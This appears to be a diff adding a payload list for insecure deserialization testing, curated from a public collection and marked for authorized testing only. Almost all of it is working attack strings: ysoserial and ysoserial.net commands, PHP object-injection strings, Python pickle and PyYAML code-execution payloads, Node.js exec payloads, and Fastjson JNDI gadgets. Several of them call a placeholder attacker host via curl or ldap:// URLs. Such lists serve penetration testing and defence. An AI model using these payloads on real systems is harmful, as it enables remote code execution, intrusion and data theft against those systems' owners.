@@ -1,0 +1,64 @@
+# Deserialization gadget payloads — curated from PAT Insecure Deserialization
+# Replace ATTACKER, CMD, paths. Authorized testing only.
+
+# === Java (ysoserial / CommonsCollections) ===
+# Generate: java -jar ysoserial.jar CommonsCollections1 'curl ATTACKER' | base64
+# Gadget chains: CommonsCollections1-7, Groovy1, Spring1-2, Hibernate1-2, JRMPClient, URLDNS
+# RMI/JNDI: ldap://ATTACKER:1389/Exploit
+# JNDI: rmi://ATTACKER:1099/Exploit
+# Spring4Shell adjacent: class path manipulation in serialized objects
+
+# === PHP object injection ===
+O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}
+O:7:"Account":1:{s:4:"role";s:5:"admin";}
+a:2:{i:0;s:4:"user";i:1;s:5:"admin";}
+O:10:"PharObject":1:{s:4:"path";s:11:"phar://evil";}
+phar://upload/evil.phar/test.txt
+O:11:"CustomClass":1:{s:4:"cmd";s:6:"whoami";}
+
+# === Python pickle ===
+cos\nsystem\n(S'curl ATTACKER'\ntR.
+csubprocess\ncheck_output\n((S'id'\ntR.
+# cPickle / pickle RCE — base64 payloads from pickle.py generator tools
+
+# === Python PyYAML unsafe load ===
+!!python/object/apply:os.system ['curl ATTACKER']
+!!python/object/new:os.system ['id']
+!!python/object/apply:subprocess.check_output [['id']]
+
+# === Ruby Marshal ===
+\x04\bI"\x06\x06:\x06ET  # inspect structure — use universal rce gadget generators
+# ERB/template in deserialized object to RCE in Rails apps
+
+# === Node.js / JavaScript ===
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl ATTACKER')}()"}
+{"__proto__":{"then":"process.mainModule.require('child_process').execSync('id')"}}
+
+# === .NET ViewState / BinaryFormatter ===
+# ysoserial.net: -g TypeConfuseDelegate -c "calc"
+# -g TextFormattingRunProperties -c "cmd /c whoami"
+# -g PSObject -c "cmd /c curl ATTACKER"
+# ViewState MAC disabled — deserialize LosFormatter payloads
+
+# === JSON type confusion (not classic deser but related) ===
+{"type":"system","command":"id"}
+{"className":"java.lang.Runtime","method":"exec","args":["id"]}
+
+# === Fastjson / Jackson / Gson Java JSON (when autoType enabled) ===
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/Exploit","autoCommit":true}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://ATTACKER/Exploit"}
+
+# === PHP unserialize + POP chain markers to hunt in source ===
+__destruct
+__wakeup
+__toString
+__call
+__get
+__set
+__invoke
+__destruct chain in Symfony/Laravel/Monolog/Guzzle
+
+# === OAST blind deserialization probes ===
+# Java: URLDNS to ATTACKER.oastify.com
+# .NET: TypeConfuseDelegate curl
+# PHP: custom class __destruct with file_get_contents('http://ATTACKER')
